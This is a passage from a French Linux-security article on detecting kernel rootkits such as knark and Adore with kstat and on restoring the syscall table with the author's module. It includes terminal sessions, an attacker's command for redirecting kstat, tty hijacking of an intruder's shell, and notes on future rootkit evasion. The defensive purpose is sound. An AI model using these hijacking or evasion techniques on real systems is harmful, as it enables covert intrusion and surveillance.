+n'est pas une nécessité passez le en nobody. <BR><FONT color=#33ccff>11-</FONT> 
+Ne pas laissez filtrer d'information sur votre machine est important. Modifiez 
+/etc/issue et /etc/issue.net ainsi que les messages d'invite des services 
+réseaux que vous fournissez. Et veillez à ne pas laisser de service tels que 
+finger ou rpcinfo et leurs acolytes à la disposition de tous. <BR><FONT 
+color=#33ccff>12-</FONT> Installez un patch de sécurité kernel comme LIDS, 
+recompilez le kernel et rebootez. Puis configurez LIDS pour protéger vos 
+fichiers sensibles et/ou vos outils de sécurité afin de s'assurer de leur 
+efficacité et de leur intégrité:)</FONT>
+<P><FONT face=Verdana size=2>En respectant ces 12 commandements, vous vous 
+mettez à l'abri d'office de nombreuses attaques. Les pirates ou crashers étant 
+des prédateurs préférant les cibles faciles afin de l'utiliser comme passerelle 
+ou shell.</FONT>
+<P><FONT face=Verdana size=2>Pensez à tapez la commande lastlog de temps à 
+autres, si un utilisateur apparaît&nbsp; ne s'être jamais logé alors que ce 
+n'est pas le cas, c'est la preuve que votre système et probablement le compte 
+incriminé sont compromis car la plupart des lastlog-cleaner effacent toute les 
+entrées, ou juste l'entrée utilisateur. Rares sont ceux qui vont simplement 
+modifier les données, ce qui serait pourtant plus discret. <BR>Si vous avez à 
+administrer un réseau, je vous conseille de le scannez à la recherche de sniffer 
+(par détection du bit <FONT color=#33ccff>PROMISC</FONT>) par exemple grâce à <A 
+href="http://www.securitysoftwaretech.com/antisniff/">AntiSniff</A> bien qu'il 
+existe là encore des contres comme <A 
+href="http://s0ftpj.org/tools/obscura.c">Obscura</A> de S0ftpj. Scannez le 
+également avec nmap, pour 2 raisons : il est important de savoir qu'elle 
+information un hacker tirera de votre système grâce à des outils très répandus 
+comme nmap, et afin de détecter si vous n'auriez pas déjà été compromis et 
+qu'une backdoor n'est pas active sur un port ! <BR>De plus faites un scan de 
+votre réseau avec <A href="http://www.nessus.org/">Nessus</A>, afin de vous 
+rendre compte de la vulnérabilité de vos machines et de les patcher au plus 
+vite. Si il s'agit d'une faille de type buffer overflow et que le patch LIDS est 
+installé il n'est toutefois pas nécessaire de stopper le service 
+vulnérable.</FONT>
+<P><FONT face=Verdana size=2><FONT color=#33ccff>[-</FONT> Comment détecter que 
+vous avez été rooté et qu'une rootkit de nouvelle génération est présente <FONT 
+color=#33ccff>-]</FONT> </FONT>
+<P><FONT face=Verdana size=2>Une petite astuce afin de vérifier que vos 
+utilisateurs simples ne s'amusent pas à vous rooter, est de faire un<FONT 
+color=#33ccff> find -user root /home</FONT> et vérifier que de nouveaux fichiers 
+root ne sont pas apparus d'une fois sur l'autre. Si c'est le cas et que vous 
+arrivez à trouver un fichier de l'intrus, faites une nouvelle recherche avec 
+find en précisant le timestamp du fichier trouvé. Si votre pirate n'a pas 
+utilisé la commande touch pour changer le timestamp de chacun de ses fichiers, 
+vous devriez vite retrouver les autres. <BR>Supposons que rien n'est visible par 
+lsmod et que l'attaquant est en mesure de se cacher totalement... mais rassurez 
+vous, nous avons aussi de bons outils. En utilisant <A 
+href="http://www.s0ftpj.org/tools/kstat.tgz">kstat</A>, programmé par FuSyS de 
+S0ftpj, une&nbsp;security team italienne, nous sommes en mesure de voir&nbsp; 
+les modules chargé et dissimulés. En effet kstat va chercher ses informations 
+sans passer par les syscall mais par <FONT color=#33ccff>/dev/kmem</FONT>. Ainsi 
+la rootkit n'est plus efficace. Sachez qu'il est possible de patcher /dev/kmem, 
+méthode inventer par <A 
+href="http://www.big.net.au/~silvio/runtime-kernel-kmem-patching.txt">Silvio 
+Cesare</A> et dont nous ne traiteront pas ici. (les rootkit actuelles ne 
+l'implémentent pas et vous ne devriez pas rencontrer de problème de ce type 
+avant la prochaine génération de lkm). kstat propose nombre de fonctionnalités 
+intéressantes comme la liste des processus actif, la liste des syscall et 
+l'adresse à laquelle ils sont (ou devraient être), etc. <BR>voyons :</FONT> 
+<P><FONT face="Courier New" size=2>sh-2.04# ./kstat</FONT> 
+<P><FONT face="Courier New" size=2>Usage: ./kstat [-i iff] [-P] [-p pid] [-M] 
+[-m addr] [-s]</FONT> 
+<P><FONT face="Courier New" size=2>-i iff may be specified as 'all' or as name 
+(e.g. eth0) <BR>&nbsp;displays info about the queried interface</FONT> 
+<P><FONT face="Courier New" size=2>-P displays all processes</FONT> 
+<P><FONT face="Courier New" size=2>-p pid is the process id of the queried 
+task</FONT> 
+<P><FONT face="Courier New" size=2>-M displays the kernel's LKMs' linked 
+list</FONT> 
+<P><FONT face="Courier New" size=2>-m addr is the hex address of the queried 
+module <BR>&nbsp;displays info about the module to be found at addr</FONT> 
+<P><FONT face="Courier New" size=2>-s displays info about the system calls' 
+table</FONT> 
+<P><FONT face="Courier New" size=2>sh-2.04# ./kstat -s | grep WARNING 
+<BR>sys_fork&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d65578 WARNING! Should be at 0xc0108fb0 
+<BR>sys_read&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d65874 WARNING! Should be at 0xc0126bc4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Permet de cacher des portions de fichiers 
+<BR>sys_execve&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d65c08 WARNING! Should be at 0xc010901c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Redirection d'execution 
+<BR>sys_kill&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d65640 WARNING! Should be at 0xc0111068&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Permet d'ajouter un flag dans la task structure 
+<BR>sys_ioctl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d656bc WARNING! Should be at 0xc0130c60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# pour cacher les processus. sys_ioctl permet lui de 
+<BR>sys_settimeofday&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d65ac4 WARNING! Should be at 0xc0118e88&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# cacher fichiers et repertoire. 
+<BR>sys_clone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d655dc WARNING! Should be at 0xc0108fd0 
+<BR>sys_getdents&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4d65454 WARNING! Should be at 0xc0130f98&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# sert a cacher le module.</FONT>
+<P><FONT face=Verdana size=2>Voila les 8 syscall que modifie la rootkit <FONT 
+color=#33ccff>knark</FONT>. <BR>D'une rootkit à une autre ce ne sont pas les 
+mêmes syscall qui sont modifiés, et cela est bien pratique pour savoir qu'elle 
+rootkit rechercher. En général une fois trouvée la rootkit elle-même il est 
+facile de trouver les autres fichiers qui appartiennent aux pirates. Si vous 
+voulez savoir quel syscall patcher pour modifier une action du système, lancez 
+votre commande en debuging avec strace :</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp; [root@localhost /root]# 
+strace cat /etc/passwd | grep read <BR>&nbsp; read(3, 
+"root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1003 <BR>&nbsp; read(3, "", 
+4096)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+= 0</FONT> 
+<P><FONT face=Verdana size=2><FONT color=#33ccff>&nbsp;&nbsp;&nbsp;&nbsp;[- Note 
+-]</FONT> <BR>&nbsp;&nbsp;&nbsp;&nbsp;On a quasiment le meme resultat si l'on 
+cherche cette fois write, ce qui prouve qu'il est possible 
+de<BR>&nbsp;&nbsp;&nbsp; patcher sys_write a la place de sys_read, ce que fait 
+Adore.</FONT>
+<P><FONT face=Verdana size=2>En modifiant insmod pour exécuter mon module à 
+chaque insertion de module vous êtes certain de ne pas avoir affaire à ce type 
+de rootkit, cependant vous pouvez aussi vous contentez d'ajouter un<FONT 
+color=#33ccff> ./kstat -s | grep WARNING &gt; /dev/null &amp;&amp; 
+./root/callpach</FONT> dans votre cron pour vous assurez de retirer les modules 
+chargés si il y en a ! <BR>Une bonne méthode consisterai à rediriger l'exécution 
+de /sbin/insmod par l'intermédiaire d'un binaire qui retire la redirection 
+d'exécution pour faire appel à l'insmod originel puis qui appel mon module via 
+/root/callpatch, et enfin replace correctement la redirection d'exécution (il 
+est nécessaire qu'insmod se trouve a son emplacement d'origine pour être 
+lancer).</FONT> 
+<P><FONT face=Verdana size=2><FONT color=#ff0000>Attention !</FONT> Ne laissez 
+pas kstat sous son nom originel, sinon vous prenez le risque qu'un hackers 
+averti ne fasse un<FONT color=#33ccff> find / -name kstat -exec ./rexec {} 
+fakekstat </FONT>et redirige votre kstat vers un faux ou les sorties seraient 
+filtrer !</FONT>
+<P><FONT face=Verdana size=2>Vous pouvez aussi aller jeter un oeil à <FONT 
+color=#33ccff>/lib/modules/"kernel-version"</FONT> pour voir les modules qui 
+sont chargés au démarrage et tenter d'identifier un module rootkit, cependant il 
+est probable que même si il y en un vous ne le verrez pas. C'est a ce moment 
+qu'en utilisant mon module puis en regardant à nouveau, vous pourrez identifier 
+les&nbsp; modules rootkit qui étaient jusqu'à présent invisibles. Voici une 
+petite démonstration de mon module, ici la rootkit est Adore pour varier un peu 
+de knark.</FONT> 
+<P><FONT face="Courier New" size=2>[root@linux KSTAT]# ./kstat -s | grep 
+W&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Apparament 
+System.map n'est pas a jour et affiche une erreur. Peu importe. 
+<BR>sys_select&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc010e598 WARNING! Should be at 0xc0131490 <BR>[root@linux KSTAT]# cd 
+/root/rootkit/adore/ <BR>[root@linux adore]# insmod 
+adore.o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Maintenant le systeme est rootkitez <BR>[root@linux adore]# cd /root/KSTAT/ 
+<BR>[root@linux KSTAT]# ./kstat -s | grep 
+W&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Si on 
+ignore sys_select, on voit les 7 syscall modifier par adore 
+<BR>sys_fork&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4cb842c WARNING! Should be at 0xc0108fb0 
+<BR>sys_write&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4cb85a0 WARNING! Should be at 0xc0126c94 
+<BR>sys_close&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4cb8650 WARNING! Should be at 0xc01268b4 
+<BR>sys_kill&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4cb84dc WARNING! Should be at 0xc0111068 
+<BR>sys_mkdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4cb873c WARNING! Should be at 0xc012f1d4 
+<BR>sys_select&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc010e598 WARNING! Should be at 0xc0131490 
+<BR>sys_clone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4cb8484 WARNING! Should be at 0xc0108fd0 
+<BR>sys_getdents&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc4cb82a8 WARNING! Should be at 0xc0130f98 <BR>[root@linux KSTAT]# cd 
+<BR>[root@linux /root]# 
+./callpatch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Lancement du patch</FONT> 
+<P><FONT face="Courier New" size=2>[!] Coder par Sauron. <BR>[*] Syscall table 
+regenerat0r launching ! <BR>Done.</FONT> 
+<P><FONT face="Courier New" size=2>[root@linux /root]# cd KSTAT/ <BR>[root@linux 
+KSTAT]# ./kstat -s | grep 
+W&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Le systeme 
+est redevenu comme lorsque le module fut chargee. <FONT color=#ff6666>Have Phun 
+:)</FONT> 
+<BR>sys_select&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+0xc010e598 WARNING! Should be at 0xc0131490 <BR>[root@linux 
+/root]#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Vous pouvez commencez la recherche des fichier du pirate.</FONT> 
+<P>Une fois le patch lancer, les processus cacher aparaitront. Faites une 
+comparaison avant et apres avoir lancer mon module et vous connaitrez les pid 
+qui etait <BR>cacher. Mon module est particulierement pratique dans le cas ou 
+vous etes infectee par la rootkit knark comme dans l'exemple d'intrusion. En 
+effet la <BR>rootkit knark cache tout ses secrets dans le repertoire <FONT 
+color=#33ccff>/proc/knark</FONT> qui est invisible. Tant que la rootkit est 
+charger ces repertoires existe, ils sont automatiquement <BR>effacer lorsque 
+knark est dechargee et que la fonction cleanup_module() s'execute. Les contenus 
+des fichiers de /proc/knark/ ne sont pas senser etre visible pour 
+l'administrateur. Cependant en lancant mon module, la rootkit bien 
+qu'inefficasse&nbsp; reste charger. Aucunes de ses fonctions ne sera plus 
+appeler. <BR>Cela signifie que une fois mon module lancer, il va vous etre 
+possible de connaitre tous les repertoires et tout les fichiers que votre pirate 
+ne voulait pas que vous voyiez en regardant les fichiers /proc/knark/ : 
+<P><FONT face="Courier New" size=2>[root@localhost knark]# cd /proc/knark 
+<BR>[root@localhost knark]# ls <BR>author&nbsp; files&nbsp; nethides&nbsp; 
+pids&nbsp; redirects <BR>[root@localhost knark]#</FONT> 
+<P>Ils contiennent les string referenssant les connexion qui vous apparaissait 
+invisible, les fichiers invisibles, les processus et les redirection d'execution 
+:) <FONT color=#ff6666>Perfect !</FONT> <BR>Une faille commune aux rootkits est 
+qu'elles sont obligées de savoir que cacher et que laisser visible. Pour cacher 
+leur processus, fichier ou autre il font donc <BR>leur donner un attribut qui 
+les demarquera des autres. Cet attribut une fois connu combiner a mon module va 
+vous permettre de trouver toutes les traces de l'activite <BR>de votre pirate 
+qui se croyait en securite derriere son module. <BR>Dans le cas de la rootkit 
+adore, les fichiers ont comme utilisateur ou comme groupe 30, pour knark ils 
+sont lister dans les fichiers de /proc/knark. <BR>Et en examinant le code de 
+chacune des rootkit vous serez en mesure de toutes les detecter et les mener en 
+echecs :) 
+<P><FONT color=#33ccff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [-</FONT> 
+Pieger son pirate <FONT color=#33ccff>-]</FONT> <BR>Pensez de temps a autre a 
+verifier que le terminaux de vos utilisateur ne sont pas root . Si c'est le cas 
+vous pouvez utilisez un module qui va <BR>changer l'uid d'un pid. Ainsi si vous 
+voyez un shell root qui n'est pas le votre, vous pouvez le passez en nobody, 
+puis surveillez son terminal en pratiquant du <BR>tty hijacking. ( des outils 
+existe et le font sans necessiter de connaissances particuliere, vous en 
+trouverez sur la meme url que pour kstat ). Si le pirate a cacher un shell suid 
+root quelque part vous pourez apprendre ou puisqu'il y a des chances qu'il y 
+fasse appel, ne comprenant pas pourquoi <FONT color=#33ccff>whoami</FONT> lui 
+affiche nobody avec un prompt de root ;) <BR>Voici un exemple d'une tel 
+modification : 
+<P><FONT face="Courier New" size=2>root@linux /root]# ps -aux | grep sh | grep 
+root <BR>(...) <BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1649&nbsp; 0.2&nbsp; 
+1.8&nbsp; 2060 1208 pts/1&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp; 
+18:24&nbsp;&nbsp; 0:00 
+/bin/sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # surtout ne pas 
+paniquer ! ;) mdr... <BR>root@linux /root]# insmod /root/lkm/thc_linback.o 
+<BR>root@linux /root]# /root/lkm/thc_lincall 99 1649 <BR>return code is: 0! 
+<BR>root@linux /root]# ps -aux | grep sh | grep nobody 
+<BR>nobody&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1649&nbsp; 0.2&nbsp; 1.8&nbsp; 2060 
+1208 pts/1&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp; 18:24&nbsp;&nbsp; 0:00 
+/bin/sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Ahh.. c'est mieux :) Merci 
+les modules ! <BR>root@linux /root]# /root/tools/ttyhijack /dev/pts/1 &gt;&gt; 
+/root/LogMrHacker &amp;; sleep 10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 
+donne moi des infos stp :)) <BR>root@linux /root]# echo Pti con va ! &gt;&gt; 
+/dev/pts/1 <BR>root@linux /root]# kill 
+1649&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Allez adios chérie :)</FONT> 
+<P>Le code de ce module se trouve a la fin de cette article :) Il peut egalement 
+vous servir pour modifier les permissions de services ( mettre httpd avec des 
+droit <BR>nobody si ce n'est pas le cas sans devoir le relancer par exemple ). 
+<BR>Je ne vais pas continuer a detailler toutes sortes de procedures a suivre, 
+j'ai simplement voulu vous presentez quelque outils de hack qu'il peut etre tres 
+utiles de se <BR>servir. 
+<P>Cette introduction a la securite Linux est terminer. Je pense que si suivez 
+tout les conseils que je vous ai donner, il ne vous arrivera jamais de vous 
+faire pirater. Et si c'est le cas, vous serez vite en mesure d'assainir votre 
+systeme,&nbsp; cependant il sera peut etre trop tard pour votre page d'accueil. 
+Allez une derniere astuce : bloquer les page d'accueil en ecriture de maniere 
+discrete avec la commande <FONT color=#33ccff>chattr +ia &lt;fichier&gt; 
+</FONT><FONT color=#ffffff>vous pourez&nbsp; retirer cette protection facilement 
+avec le meme binaire, mais il est peu probable qu'un pirate y pense, de plus 
+vous pouvez cacher le binaire chattr ( </FONT><FONT color=#33ccff>whereis chattr 
+</FONT><FONT color=#ffffff>pour le trouver ). La meilleur methode pour s'assurer 
+de ne pas etre visitee reste encore</FONT> de s'informer des nouveau exploits 
+disponible pour l'ennemie, et de ne pas le laisser vous devancer. Je vous 
+conseille d'aller jeter un oeil a <FONT color=#ff6666>Bugtraq</FONT> sur<FONT 
+color=#33ccff> www.security-focus.com</FONT> qui recense les nouvelles failles 
+decouvertes et les discussions qui y sont liées :) Prendre 5 minutes de votre 
+temps tout les mois n'est pas exagerer pour garder son systeme des curieux. 
+<P>Nous avons vu comment nous proteger efficassement des outils de la nouvelles 
+generation, mais il se prepare deja ceux de demain : <BR>Les rootkits patcheront 
+directement <FONT color=#33ccff>/dev/kmem</FONT> afin de ne pas se laissez 
+reperer par des outils comme kstat, de plus la table des syscall ne sera plus 
+modifier, <BR>les syscall seront directement hijacker ( en placant par exemple 
+un jump comme premiere instruction vers le faux syscall directement a l'adresse 
+sur le vrai syscall). <BR>Le talentueux coder Silvio Cesare a deja ecrit des 
+articles, difusant des codes sources de tels modules, cependant ceux ci ne sont 
+pas encore distribuer dans des <BR>rootkits, on peut craindre que cela arrive 
+tres vite. J'ai quand meme equiper mon module&nbsp; d'une parade contre ce type 
+d'attaque, lors de son chargement il <BR>sauvegarde les 15 premiers octets de 
+chacun des syscall auquels nous tenons pour les reinscrire plus tard.Ainsi si un 
+jump a ete ajouter il sera retirer et le syscall remis <BR>dans son etat 
+originaire. <BR>Une methode efficasse que les pirates pourraient alors utiliser, 
+serait de ne pas modifier l'adresse des syscall dans la syscall table, mais 
+d'ecrire directement <BR>sur les syscall et d'y placer le syscall modifier a la 
+maniere dont on pose un shellcode en memoire. Ce type d'attaque pourra berner 
+mon module quand ce "syscall"-code <BR>aura les memes 15 premier octet que le 
+syscall identique. Nous n'en sommes pas encore la et je pense que mon module 
+fera l'affaire pour un petit bout de temps. 
+<P>En attendant qu'il soit vraiment necessaure de se proteger de se type 
+d'outils des plus vicieux, protegez deja votre machine des failles actuellement 
+exploiter =) <BR>Et meme si la plupart des piratage sont tres facilement 
+detectable, n'oubliez pas qu'il existe des hackers metrisant le systeme Linux, 
+particulierement au <BR>niveau de la securite, c'est pourquoi mieux vaut 
+installer des protections efficasses pour ne pas rester sans defenses devant de 
+tels individu. <BR>Heureusement pour les admins dont le systeme est deja 
+compromis, rien n'est desesperer. En allant chercher les informations 
+<BR>directement dans /dev/kmem vous&nbsp; pourez recuperer l'adresse originel 
+des syscall qui ont ete modifier. En rajoutant quelque #define a mon <BR>module 
+( la procedure est detaille en commentaire avec celui ci ) vous devriez arrivez 
+a remetre votre syscall table en etat :) <BR>Je fournit avec cet article les 
+code sources permettant de recupere votre systeme des mains d'un pirate. Ouf ! 
+<P>J'espere vous avoir donner quelque idee pour mettre a profit la puissance des 
+modules et ne surtout pas&nbsp; laissez les puissants outils de la communaute 
+<BR>hackers uniquement pour leur usage. 
+<P>Bon courage a tous pour administrer&nbsp; votre r3z0 et le faire devenir 
+securisé :) 
+<P><FONT size=2><B><FONT color=#33ccff face=Verdana>Nicolas Brito a.k.a 
+</FONT><A href="mailto:humour@humour.com"><FONT color=#33ccff 
+face=Verdana>Sauron</FONT></A></B> <FONT face=Verdana><BR><B>N'hesitez pas pour 
+tout commentaires ou pour de l'aide</B> </FONT></FONT>
+<P><FONT size=2><B><FONT face=Verdana>ps :</FONT></B> <FONT face=Verdana>Je 
+tient a faire savoir que le (<B>mauvais</B>) magazine Hackerz Voice m'a voler 
+les droit d'un article que j'avais écrit l'été dernier et publié sur le réseau 
+sous le titre <BR>"Sécuriser son linux". Hackerz voice a publié mon article dans 
+son intégralité en prenant soin d'effacer mon e-mail et ma signature puis en 
+signant "Prof". <BR>Après un courrier en recommandé, ils me font savoir que je 
+n'en suis pas l'auteur, m'obligeant ainsi à régler ce litige par la voie 
+judiciaire. <B>Non mais !</B> </FONT></FONT>
+<CENTER>
+<P><B><FONT color=#ffffff face=Verdana size=2>-=-=-=-=-=-=-=-= Code Source 
+-=-=-=-=-=-=-=-=-=-</FONT></B></CENTER>
+<P><FONT face=Verdana size=2><FONT color=#ffffff>### Voila plusieurs outils qui 
+vous seront très utile j'en suis sûr :</FONT> <BR><FONT color=#ffffff>1- Le 
+premier code est mon module, suivi du programme destinée à y faire appel 
+(respectivement patch.c et callpatch.c)</FONT> <BR><FONT color=#ffffff>2- Le 
+second n'est autre qu'un fragment du programme kstat que j'ai modifié. Désormais 
+il sert uniquement à afficher l'état des syscall. </FONT><FONT 
+color=#ffffff>Cela uniquement dans le but de s'assurer que le système est sain 
+au moment ou vous chargerez mon module.</FONT> <BR><FONT color=#ffffff>Pour une 
+utilisation autre de kstat,&nbsp; je vous invite à aller le téléchargement sur 
+s0ftpr0j.</FONT> <FONT color=#ffffff>Kstat se compose lui aussi de 2 fichiers : 
+kmemread.c (c'est ce programme que j'ai modifié, il est désormais destiné à 
+aller</FONT> <FONT color=#ffffff>chercher l'adresse originelle des syscall 
+généralement modifié par les rootkits) et le lanceur de kstat, main.c.</FONT> 
+<BR><FONT color=#ffffff>4- Vous trouverez ensuite encore un module et son 
+lanceur, c'est celui qui permet de modifier l'uid d'un pid. Comme mon module, il 
+implémente un nouveau syscall pour faire </FONT><FONT color=#ffffff>le 
+boulot.</FONT> <BR><FONT color=#ffffff>5- Enfin j'ai écrit un petit script shell 
+destinée à vous installez tout ça, vous n'aurez qu'a réunir les fichiers qui 
+suivent dans un même répertoire et à lancer </FONT><FONT color=#ffffff>le script 
+</FONT><FONT color=#ff6666>Install.sh</FONT><FONT color=#ffffff> !</FONT> 
+</FONT>
+<CENTER>
+<P><FONT face="Courier New" size=2>-=-=-=-=-=Cut here=-=-=-=-=-=</FONT></CENTER>
+<P><FONT face="Courier New" size=2><B><FONT color=#33ccff>Patch.c</FONT></B> 
+:</FONT> 
+<P><FONT face="Courier New" size=2>/* <BR>*&nbsp;&nbsp;&nbsp;&nbsp; Description 
+: Ce module linux va ajouter un syscall numero SYSNUM, 191 par default. Je 
+conseille de modifier <BR>*&nbsp;&nbsp;&nbsp;&nbsp; ce numero pour eviter une 
+redirection de syscall, ce dont ce module veut eviter ! 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp; Ce module sauvegarde les syscall affecte par les 
+module trojan des rootkit comme knark ou encore Ombra. 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp; A l'appel du syscall SYSNUM, la sys_call_table est 
+remise dans l'etat ou elle a ete trouver, <BR>*&nbsp;&nbsp;&nbsp;&nbsp; annulant 
+ainsi l'effet des module trojan. De plus les 15 premiers bytes de chacun des 
+syscall que nous <BR>*&nbsp;&nbsp;&nbsp;&nbsp; tenont a preserver sont 
+sauvegarder pour etre remis en place, evitant ainsi le hijacking de syscall. 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp; ( methode inventer par Silvio Cesare pour ne pas 
+avoir besoin de modifier la syscall table et eviter les IDS ). <BR>* 
